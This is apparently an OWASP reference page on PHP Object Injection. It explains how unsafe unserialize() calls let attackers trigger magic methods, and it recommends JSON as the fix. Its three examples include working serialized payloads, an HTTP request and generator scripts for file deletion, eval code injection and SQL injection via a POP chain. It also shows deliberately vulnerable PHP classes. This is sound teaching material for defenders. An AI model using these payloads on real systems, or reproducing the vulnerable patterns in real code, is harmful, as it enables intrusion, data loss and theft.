# PHP Object Injection

Thank you for visiting OWASP.org. We have migrated our community to a new web platform and regretably the content for this page needed to be programmatically ported from its previous wiki page. There’s still some work to be done.

This is an example of a Project or Chapter Page.

**Author:** Egidio Romano

## Description

PHP Object Injection is an application level vulnerability that could
allow an attacker to perform different kinds of malicious attacks, such
as [Code Injection](Code_Injection "wikilink"), [SQL
Injection](https://owasp.org/www-community/attacks/SQL_Injection), [Path
Traversal](Path_Traversal "wikilink") and [Application Denial of
Service](Application_Denial_of_Service "wikilink"), depending on the
context. The vulnerability occurs when user-supplied input is not
properly sanitized before being passed to the unserialize() PHP
function. Since PHP allows object serialization, attackers could pass
ad-hoc serialized strings to a vulnerable unserialize() call, resulting
in an arbitrary PHP object(s) injection into the application scope.

In order to successfully exploit a PHP Object Injection vulnerability
two conditions must be met:

* The application must have a class which implements a PHP magic
  method (such as \_\_wakeup or \_\_destruct) that can be used to
  carry out malicious attacks, or to start a “POP chain”.
* All of the classes used during the attack must be declared when the
  vulnerable unserialize() is being called, otherwise object
  autoloading must be supported for such classes.

## Examples

**Example 1**

The example below shows a PHP class with an exploitable \_\_destruct
method:

```
class Example1
{
   public $cache_file;

   function __construct()
   {
      // some PHP code...
   }

   function __destruct()
   {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

$user_data = unserialize($_GET['data']);

// some PHP code...

```

In this example an attacker might be able to delete an arbitrary file
via a [Path Traversal](Path_Traversal "wikilink") attack, for e.g.
requesting the following URL:

```
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}

```

**Example 2**

The example below shows a PHP class with an exploitable \_\_wakeup
method:

```
class Example2
{
   private $hook;

   function __construct()
   {
      // some PHP code...
   }

   function __wakeup()
   {
      if (isset($this->hook)) eval($this->hook);
   }
}

// some PHP code...

$user_data = unserialize($_COOKIE['data']);

// some PHP code...

```

In this example an attacker might be able to perform a [Code
Injection](Code_Injection "wikilink") attack by sending an HTTP request
like this:

```
GET /vuln.php HTTP/1.0
Host: testsite.com
Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
Connection: close

```

Where the cookie parameter “data” has been generated by the following
script:

```
class Example2
{
   private $hook = "phpinfo();";
}

print urlencode(serialize(new Example2));

```

**Example 3**

This last example shows how it is possible to perform a [SQL
Injection](https://owasp.org/www-community/attacks/SQL_Injection) attack using a “POP chain”, for
instance by leveraging a \_\_toString method like this:

```
class Example3
{
   protected $obj;

   function __construct()
   {
      // some PHP code...
   }

   function __toString()
   {
      if (isset($this->obj)) return $this->obj->getValue();
   }
}

// some PHP code...

$user_data = unserialize($_POST['data']);

// some PHP code...

```

If the $user\_data variable is an “Example3” object and it will be
treated like a string somewhere in the code, then its \_\_toString
method will be called. Since this method will call the getValue method
of the object stored into the “obj” property, it’s possible to set that
property to an arbitrary object, and execute its getValue method, if it
is accessible, otherwise its \_\_call method will be called, if it is
defined. For the sake of ease, just think that when unserialize() is
called, the class below is available within the application scope (or
supported by autoloading):

```
class SQL_Row_Value
{
   private $_table;

   // some PHP code...

   function getValue($id)
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = " . (int)$id;
      $result = mysql_query($sql, $DBFactory::getConnection());
      $row = mysql_fetch_assoc($result);

      return $row['value'];
   }
}

```

In this example an attacker might be able to perform a [SQL
Injection](https://owasp.org/www-community/attacks/SQL_Injection) attack by sending a POST request
containing a “data” parameter generated by a script like this:

```
class SQL_Row_Value
{
   private $_table = "SQL Injection";
}

class Example3
{
   protected $obj;

   function __construct()
   {
      $this->obj = new SQL_Row_Value;
   }
}

print urlencode(serialize(new Example3));

```

## Prevention

Do not use unserialize() function with user-supplied input, use JSON
functions instead.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
